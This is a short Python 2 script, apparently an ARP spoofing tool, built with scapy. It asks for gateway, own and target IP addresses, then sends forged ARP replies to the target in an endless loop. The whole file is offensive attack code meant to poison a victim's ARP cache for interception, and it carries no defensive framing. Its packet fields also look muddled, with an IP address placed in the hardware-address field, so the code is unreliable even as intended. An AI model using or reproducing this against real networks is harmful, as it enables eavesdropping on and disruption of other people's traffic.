import os
import sys
from scapy.layers.l2 import getmacbyip
from scapy.all import (
  Ether,
  ARP,
  sendp
)

ifconfig=os.system('ifconfig')
print ifconfig
gmac=raw_input('Please enter gateway IP:')
liusheng=raw_input('Please enter your IP:')
liusrc=raw_input('Please enter target IP:')
try:
  tg=getmacbyip(liusrc)
  print tg
except Exception , f:
    print '[-]{}'.format(f)
    exit()
def arpspoof():
  try:
    eth=Ether()
    arp=ARP(
        op="is-at",
        hwsrc=gmac,
        psrc=liusheng,
        hwdst=tg,
        pdst=liusrc
    )
    print ((eth/arp).show())
    sendp(eth/arp,inter=2,loop=1)
  except Exception ,g:
      print '[-]{}'.format(g)
      exit()
arpspoof()